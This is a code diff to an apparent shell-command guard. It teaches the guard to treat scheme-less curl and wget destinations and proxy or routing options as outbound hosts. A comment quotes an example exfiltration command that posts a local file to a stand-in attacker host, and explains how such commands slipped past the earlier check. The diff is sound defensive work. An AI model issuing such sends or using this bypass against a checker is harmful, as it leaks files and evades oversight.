@@ -794,12 +794,18 @@ _URL_IN_TOKEN = re.compile(r'https?://[^\s\'"<>]+', re.I)
 
 
 def urls_in(cmd):
-    """Every http(s) URL in the command's shell words, quotes removed."""
+    """Every URL this command names: each http(s) URL in its shell words, plus
+    every destination a curl or wget in it is given WITHOUT a scheme (see
+    fetch_targets), written as `http://<target>` the way both tools read it."""
     try:
         tokens = shell_tokens(cmd)
     except ValueError:
         tokens = re.split(r'[\s;&|]', cmd)
-    return [url for token in tokens for url in _URL_IN_TOKEN.findall(token)]
+    urls = [url for token in tokens for url in _URL_IN_TOKEN.findall(token)]
+    for exe, args in invocations_in(cmd):
+        if exe in READ_ONLY_FETCHERS:
+            urls += [t for t in fetch_targets(exe, args) if t not in urls]
+    return urls
 
 
 def url_host(url):
@@ -815,6 +821,119 @@ def hosts_in(cmd):
     return [url_host(url) for url in urls_in(cmd)] + REMOTE_TARGET_RE.findall(cmd)
 
 
+# ── A DESTINATION WITHOUT A SCHEME (2026-10-08) ───────────────────────────────
+#
+# curl and wget read a bare `evil.example.com/path` as a URL. The host check
+# above used to see only `http(s)://` text, so `curl evil.example.com -d @x`
+# named no host, had nothing to fail, and the send went through. So every
+# operand of a curl or wget that can carry a destination is read as one: each
+# positional operand that parses as a host (a dotted name, an IP, a single
+# label, with optional user@, :port and path), the value of --url, and the
+# values of the options that ROUTE the request somewhere else (a proxy,
+# --connect-to, --resolve, --doh-url), because a body sent through an
+# unlisted proxy has reached that proxy. Option values are skipped by the same
+# arity tables the plain-fetch check uses, so `-o page.html` is a file name,
+# not a host; a numeric word (`--max-time 10` if an arity were ever missed) is
+# never read as a host.
+_HOSTLIKE = re.compile(
+    r"^(?:[^@/\s:]+(?::[^@/\s]*)?@)?"
+    r"(?:\[[0-9A-Fa-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?"
+    r"(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)*\.?)"
+    r"(?::\d*)?(?:[/?#].*)?$")
+_ROUTE_LONG = frozenset({"url", "proxy", "preproxy", "proxy1.0", "socks4", "socks4a", "socks5",
+                         "socks5-hostname", "doh-url", "connect-to", "resolve"})
+_CURL_ARG_LONG = frozenset({
+    "abstract-unix-socket", "alt-svc", "aws-sigv4", "cacert", "capath", "cert", "cert-type",
+    "ciphers", "config", "connect-timeout", "connect-to", "continue-at", "cookie", "cookie-jar",
+    "create-file-mode", "crlfile", "curves", "data", "data-ascii", "data-binary", "data-raw",
+    "data-urlencode", "delegation", "dns-interface", "dns-ipv4-addr", "dns-ipv6-addr",
+    "dns-servers", "doh-url", "dump-header", "ech", "egd-file", "engine", "etag-compare",
+    "etag-save", "expect100-timeout", "form", "form-escape", "form-string", "ftp-account",
+    "ftp-alternative-to-user", "ftp-method", "ftp-port", "ftp-ssl-ccc-mode",
+    "happy-eyeballs-timeout-ms", "haproxy-clientip", "header", "hostpubmd5", "hostpubsha256",
+    "hsts", "interface", "ip-tos", "ipfs-gateway", "json", "keepalive-cnt", "keepalive-time",
+    "key", "key-type", "krb", "libcurl", "limit-rate", "local-port", "login-options",
+    "mail-auth", "mail-from", "mail-rcpt", "max-filesize", "max-redirs", "max-time",
+    "netrc-file", "noproxy", "oauth2-bearer", "output", "output-dir", "parallel-max", "pass",
+    "pinnedpubkey", "preproxy", "proto", "proto-default", "proto-redir", "proxy",
+    "proxy-cacert", "proxy-capath", "proxy-cert", "proxy-cert-type", "proxy-ciphers",
+    "proxy-crlfile", "proxy-header", "proxy-key", "proxy-key-type", "proxy-pass",
+    "proxy-pinnedpubkey", "proxy-service-name", "proxy-tls13-ciphers", "proxy-tlsauthtype",
+    "proxy-tlspassword", "proxy-tlsuser", "proxy-user", "proxy1.0", "pubkey", "quote",
+    "random-file", "range", "rate", "referer", "request", "request-target", "resolve",
+    "retry", "retry-delay", "retry-max-time", "sasl-authzid", "service-name", "sigalgs",
+    "socks4", "socks4a", "socks5", "socks5-gssapi-service", "socks5-hostname", "speed-limit",
+    "speed-time", "stderr", "telnet-option", "tftp-blksize", "time-cond", "tls-max",
+    "tls13-ciphers", "tlsauthtype", "tlspassword", "tlsuser", "trace", "trace-ascii",
+    "trace-config", "unix-socket", "upload-file", "upload-flags", "url", "url-query", "user",
+    "user-agent", "variable", "write-out"})
+_WGET_ARG_LONG = frozenset({
+    "accept", "accept-regex", "append-output", "ask-password", "backups", "base",
+    "bind-address", "bind-dns-address", "body-data", "body-file", "ca-certificate",
+    "ca-directory", "certificate", "certificate-type", "ciphers", "compression", "config",
+    "connect-timeout", "crl-file", "cut-dirs", "default-page", "directory-prefix",
+    "dns-servers", "dns-timeout", "domains", "exclude-directories", "exclude-domains",
+    "execute", "ftp-password", "ftp-user", "header", "hsts-file", "http-password",
+    "http-user", "include-directories", "input-file", "level", "limit-rate", "load-cookies",
+    "local-encoding", "max-redirect", "method", "output-document", "output-file", "password",
+    "pinnedpubkey", "post-data", "post-file", "prefer-family", "private-key",
+    "private-key-type", "progress", "proxy-password", "proxy-user", "quota", "random-file",
+    "read-timeout", "referer", "regex-type", "reject", "reject-regex", "rejected-log",
+    "remote-encoding", "report-speed", "restrict-file-names", "retry-on-http-error",
+    "save-cookies", "secure-protocol", "timeout", "tries", "use-askpass", "user",
+    "user-agent", "wait", "waitretry", "warc-cdx", "warc-dedup", "warc-file", "warc-header",
+    "warc-max-size", "warc-tempdir"})
+
+
+def _as_url(word):
+    return word if "://" in word else f"http://{word}"
+
+
+def _route_targets(name, value):
+    """Destinations carried by a routing option's value."""
+    if name in ("connect-to", "resolve"):
+        # HOST1:PORT1:HOST2:PORT2 / HOST:PORT:ADDR[,ADDR] — every name or address in it.
+        fields = re.split(r"[:,]", value.strip("[]"))
+        return [_as_url(f) for f in fields if f and not f.isdigit() and _HOSTLIKE.match(f)]
+    return [_as_url(value)] if value and _HOSTLIKE.match(value.split("://", 1)[-1]) else []
+
+
+def fetch_targets(tool, words):
+    """Every destination one curl/wget invocation is given without an http(s)
+    scheme, as `http://...` URLs (see A DESTINATION WITHOUT A SCHEME)."""
+    arg_long = _CURL_ARG_LONG if tool == "curl" else _WGET_ARG_LONG
+    arg_short = _CURL_ARG_SHORT if tool == "curl" else _WGET_ARG_SHORT
+    targets, i, operands_only = [], 0, False
+    while i < len(words):
+        w = words[i]
+        i += 1
+        if not operands_only and w == "--":
+            operands_only = True
+        elif not operands_only and w.startswith("--") and len(w) > 2:
+            name, eq, value = w[2:].partition("=")
+            name = name.lower()
+            if name in arg_long or name in _ROUTE_LONG:
+                if not eq and i < len(words):
+                    value = words[i]
+                    i += 1
+                if name in _ROUTE_LONG:
+                    targets += _route_targets(name, value)
+        elif not operands_only and w.startswith("-") and len(w) > 1:
+            cluster = w[1:]
+            for k, ch in enumerate(cluster):
+                if ch in arg_short:
+                    value = cluster[k + 1:]
+                    if not value and i < len(words):
+                        value = words[i]
+                        i += 1
+                    if tool == "curl" and ch == "x":
+                        targets += _route_targets("proxy", value)
+                    break
+        elif not re.match(r"https?://", w, re.I) and not w.isdigit() and _HOSTLIKE.match(w):
+            targets.append(_as_url(w))
+    return targets
+
+
 def _exe_name(word):
     """A word read as an executable name: path and stray quoting removed, lowercased."""
     return os.path.basename(word.strip("'\"\\")).lower()
@@ -828,43 +947,57 @@ def _shell_c_script(words):
     return None
 
 
-def command_executables(words, depth=0):
-    """Every executable one simple command could run, after normalising command
-    position (see THE SENDER TEST). `words` are its shell words."""
+def command_invocations(words, depth=0):
+    """Every (executable, its argument words) one simple command could run,
+    after normalising command position (see THE SENDER TEST)."""
     i = 0
     while i < len(words) and (_ASSIGNMENT.match(words[i]) or words[i] in _COMMAND_KEYWORDS):
         i += 1
     if i >= len(words):
         return []
     exe, rest = _exe_name(words[i]), words[i + 1:]
+    found = [(exe, rest)]
     if exe in COMMAND_WRAPPERS:
         # A word with spaces is a quoted command string (`su -c '...'`,
         # `sudo sh -c '...'`, `watch '...'`), so it is read as a command.
-        found = [exe]
-        for w in rest:
+        for k, w in enumerate(rest):
             if any(c.isspace() for c in w):
-                found += executables_in(w, depth + 1) if depth < 4 else []
+                found += invocations_in(w, depth + 1) if depth < 4 else []
             elif "://" not in w:
-                found.append(_exe_name(w))
+                found.append((_exe_name(w), rest[k + 1:]))
         return found
     script = " ".join(rest) if exe == "eval" else (
         _shell_c_script(rest) if _SHELLS.match(exe) else None)
     if script and depth < 4:
-        return [exe] + executables_in(script, depth + 1)
-    return [exe]
+        found += invocations_in(script, depth + 1)
+    return found
+
+
+def command_executables(words, depth=0):
+    """The executable names of command_invocations."""
+    return [exe for exe, _ in command_invocations(words, depth)]
 
 
 def _command_words(segment):
     """Shell words of one raw segment; unbalanced quoting falls back to splitting."""
     try:
-        return shlex.split(segment, posix=True)
+        words = shlex.split(segment, posix=True)
     except ValueError:
-        return [w.strip("'\"") for w in segment.split()]
+        words = [w.strip("'\"") for w in segment.split()]
+    return _without_redirects(words)
 
 
-def executables_in(cmd, depth=0):
-    """Every executable `cmd` could run, from both the quoted-word reading and
-    the raw boundary-split reading (see THE SENDER TEST)."""
+def _without_redirects(words):
+    words = [w for w in words if w not in ("(", ")", "{", "}")]
+    try:
+        return shell_operands(words)[0]
+    except ValueError:
+        return words
+
+
+def invocations_in(cmd, depth=0):
+    """Every (executable, argument words) `cmd` could run, from both the
+    quoted-word reading and the raw boundary-split reading (see THE SENDER TEST)."""
     found = []
     try:
         tokens = shell_tokens(cmd)
@@ -873,17 +1006,12 @@ def executables_in(cmd, depth=0):
     segment = []
     for token in tokens + [";"]:
         if token in SHELL_BOUNDARIES:
-            words = [w for w in segment if w not in ("(", ")", "{", "}")]
-            try:
-                words = shell_operands(words)[0]
-            except ValueError:
-                pass
-            found += command_executables(words, depth)
+            found += command_invocations(_without_redirects(segment), depth)
             segment = []
         else:
             segment.append(token)
     for raw in _RAW_BOUNDARY.split(cmd):
-        found += command_executables(_command_words(raw), depth)
+        found += command_invocations(_command_words(raw), depth)
     return found
 
 
@@ -894,7 +1022,8 @@ def is_send_context(cmd):
     position, or an interpreter that references a network client library. A
     command that merely quotes a URL matches neither.
     """
-    return bool(NET_CLIENT.search(cmd) or _SENDER_NAMES.intersection(executables_in(cmd)))
+    return bool(NET_CLIENT.search(cmd)
+                or _SENDER_NAMES.intersection(exe for exe, _ in invocations_in(cmd)))
 
 # ── THE PLAIN READ-ONLY FETCH (Joe, 2026-10-07) ──────────────────────────────
 #
@@ -1033,7 +1162,7 @@ def _fetch_flag_refusal(tool, words, cwd=None):
     if remote_name:
         # curl -O names the file after the URL's last path segment, and overwrites.
         outputs += [urlsplit(w).path.rsplit("/", 1)[-1]
-                    for w in words if re.match(r"https?://", w, re.I)]
+                    for w in words + fetch_targets(tool, words) if re.match(r"https?://", w, re.I)]
     for path in outputs:
         if not _safe_fetch_output(path, cwd):
             return f"{tool} would write fetched bytes to {path or '(none)'}"
